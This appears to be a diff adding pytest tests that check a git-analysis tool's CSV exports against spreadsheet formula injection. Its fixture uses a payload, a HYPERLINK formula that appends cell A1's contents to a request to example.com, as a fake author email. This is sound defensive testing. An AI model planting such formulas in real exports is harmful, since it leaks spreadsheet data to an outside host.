@@ -426,3 +426,74 @@ def test_table_shows_author_markup_literally(krunner, monkeypatch):
     result = _invoke(krunner, "key-person", "github.com~acme~web")
     assert result.exit_code == 0, result.output
     assert "[bold]x[/]@acme.com" in result.output
+
+
+# --- CSV formula injection (CWE-1236) -------------------------------------------
+# An author email is free text in git, so a committer can make it a spreadsheet
+# formula. The CSV is spreadsheet-safe by default; -raw writes it as stored.
+
+FORMULA = '=HYPERLINK("https://example.com/?"&A1,"x")'
+
+
+@pytest.mark.parametrize("value,expected", [
+    ("=1+1", "'=1+1"), ("+1", "'+1"), ("-1", "'-1"), ("@SUM(A1)", "'@SUM(A1)"),
+    ("\t=1", "'\t=1"), ("\r=1", "'\r=1"),
+    ("dev@acme.com", "dev@acme.com"), ("", ""),
+    (-5, -5), (-2.5, -2.5), (None, None),   # numbers stay numbers
+])
+def test_spreadsheet_safe(value, expected):
+    import krunner_utils as KrunnerUtils
+    assert KrunnerUtils.spreadsheet_safe(value) == expected
+
+
+@pytest.fixture
+def krunner_formula_author(krunner, monkeypatch):
+    kq = _seed()
+    kq.kospex_db[KospexSchema.TBL_COMMITS].insert_all(
+        [_commit("github.com~acme~web", f"f{i}", FORMULA, 1) for i in range(3)],
+        pk=["_repo_id", "hash"])
+    monkeypatch.setattr(krunner.kospex, "kospex_query", kq)
+    return krunner
+
+
+@pytest.mark.parametrize("command,column", [
+    ("key-person", "author"), ("bus-factor", "top_author"),
+    ("bus-factor", "active_top_author"),
+])
+def test_csv_is_spreadsheet_safe_by_default(krunner_formula_author, command, column):
+    result = _invoke(krunner_formula_author, command, "github.com~acme~web", "-stdout")
+    assert result.exit_code == 0, result.stderr
+    values = [r[column] for r in _csv(result.stdout)]
+    assert "'" + FORMULA in values
+    assert FORMULA not in values
+
+
+def test_csv_file_is_spreadsheet_safe_by_default(krunner_formula_author, tmp_path):
+    out = tmp_path / "kp.csv"
+    result = _invoke(krunner_formula_author, "key-person", "github.com~acme~web",
+                     "-out", str(out))
+    assert result.exit_code == 0, result.output
+    authors = [r["author"] for r in _csv(out.read_text())]
+    assert "'" + FORMULA in authors and FORMULA not in authors
+    assert "dev@acme.com" in authors     # ordinary values are untouched
+
+
+@pytest.mark.parametrize("command,column", [("key-person", "author"),
+                                            ("bus-factor", "top_author")])
+def test_raw_writes_values_as_stored(krunner_formula_author, command, column):
+    result = _invoke(krunner_formula_author, command, "github.com~acme~web",
+                     "-stdout", "-raw")
+    assert result.exit_code == 0, result.stderr
+    assert FORMULA in [r[column] for r in _csv(result.stdout)]
+
+
+def test_raw_without_csv_output_is_refused(krunner):
+    result = _invoke(krunner, "bus-factor", "-all", "-raw")
+    assert result.exit_code == 2
+    assert "-raw only applies to the CSV" in result.output
+
+
+def test_table_shows_formula_author_literally(krunner_formula_author):
+    result = _invoke(krunner_formula_author, "key-person", "github.com~acme~web")
+    assert result.exit_code == 0, result.output
+    assert FORMULA in result.output     # the table is not a spreadsheet; no quote
